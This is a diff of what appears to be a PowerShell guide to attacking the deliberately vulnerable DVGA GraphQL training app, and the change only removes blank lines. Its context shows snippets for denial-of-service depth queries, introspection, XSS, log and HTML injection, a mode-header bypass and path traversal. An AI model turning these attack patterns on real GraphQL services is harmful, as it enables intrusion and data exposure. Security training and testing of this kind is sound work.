@@ -102,7 +102,6 @@ query {
 '
 
 Invoke-GraphQLQuery -Query $depthAttackQuery -Uri $gqlEndpointUri -Raw
-
 ```
 
 
@@ -125,7 +124,6 @@ $totalSeconds = $delta.Seconds
 $message = "Total seconds to execute query: {0}" -f $totalSeconds
 
 Write-Host -Object $message -ForegroundColor Cyan
-
 ```
 
 ## Information Disclosure :: GraphQL Introspection
@@ -141,7 +139,6 @@ $introspectionQuery = '
 '
 
 Invoke-GraphQLQuery -Query $introspectionQuery -Uri $gqlEndpointUri -Raw
-
 ```
 
 
@@ -153,7 +150,6 @@ $graphiqlUri = "{0}/graphiql" -f $targetUri
 $headers = @{Accept="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"}
 
 Invoke-WebRequest -Uri $graphiqlUri -Headers $headers -Method Get -UseBasicParsing | Select -ExpandProperty Content
-
 ```
 
 
@@ -166,7 +162,6 @@ $fieldSuggestionsQuery = '
 '
 
 Invoke-GraphQLQuery -Query $fieldSuggestionsQuery -Uri $gqlEndpointUri -Raw
-
 ```
 
 
@@ -181,7 +176,6 @@ mutation {
 '
 
 Invoke-GraphQLQuery -Mutation $requestForgeryMutation -Uri $gqlEndpointUri -Raw
-
 ```
 
 
@@ -248,7 +242,6 @@ $xssInjectionMutation = '
 '
 
 Invoke-GraphQLQuery -Mutation $xssInjectionMutation -Uri $gqlEndpointUri -Raw
-
 ```
 
 
@@ -266,7 +259,6 @@ $logInjectionMutation = '
 '
 
 Invoke-GraphQLQuery -Mutation $logInjectionMutation -Uri $gqlEndpointUri
-
 ```
 
 
@@ -284,7 +276,6 @@ $htmlInjectionMutation = '
 '
 
 Invoke-GraphQLQuery -Mutation $htmlInjectionMutation -Uri $gqlEndpointUri -Raw
-
 ```
 
 
@@ -316,7 +307,6 @@ $cookie.Domain = $domain
 $session.Cookies.Add($cookie)
 
 Invoke-GraphQLQuery -Query $reconQuery -Uri $gqlEndpointUri -WebSession $session -Raw
-
 ```
 
 
@@ -331,7 +321,6 @@ $bypassQuery = '
 $headers= @{'X-DVGA-MODE'='Expert'}
 
 Invoke-GraphQLQuery -Query $bypassQuery -Uri $gqlEndpointUri -Headers $headers -Raw
-
 ```
 
 
@@ -346,7 +335,6 @@ $pathTraversalMutation = '
 '
 
 Invoke-GraphQLQuery -Mutation $pathTraversalMutation -Uri $gqlEndpointUri -Raw
-
 ```
 
 
